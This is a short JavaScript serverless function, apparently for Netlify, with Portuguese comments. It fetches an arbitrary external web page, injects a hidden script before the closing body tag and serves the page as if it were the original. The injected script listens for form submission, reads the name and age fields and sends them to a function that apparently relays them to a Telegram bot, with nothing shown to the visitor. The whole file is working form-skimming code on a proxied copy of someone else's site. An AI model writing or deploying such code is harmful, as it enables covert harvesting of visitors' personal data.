export async function handler(event) {
  const { url } = event.queryStringParameters;

  if (!url) {
    return { statusCode: 400, body: 'URL obrigatória' };
  }

  try {
    const response = await fetch(url);
    let html = await response.text();

    // Injeta script no final do body para capturar dados
    const injectScript = `
      <script>
      (function(){
        const form = document.querySelector('form');
        if(form){
          form.addEventListener('submit', async (e) => {
            try {
              const nomeField = document.querySelector('[placeholder="nome"]');
              const idadeField = document.querySelector('[placeholder="idade"]');
              const nome = nomeField ? nomeField.value : '';
              const idade = idadeField ? idadeField.value : '';

              // envia ao bot
              await fetch('/.netlify/functions/sendTelegram', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({ nome, idade })
              });
            } catch(err){ console.error(err); }
          });
        }
      })();
      </script>
    `;

    html = html.replace(/<\/body>/i, injectScript + '</body>');

    return {
      statusCode: 200,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
      body: html,
    };
  } catch (err) {
    console.error(err);
    return { statusCode: 500, body: 'Erro ao carregar site externo' };
  }
}
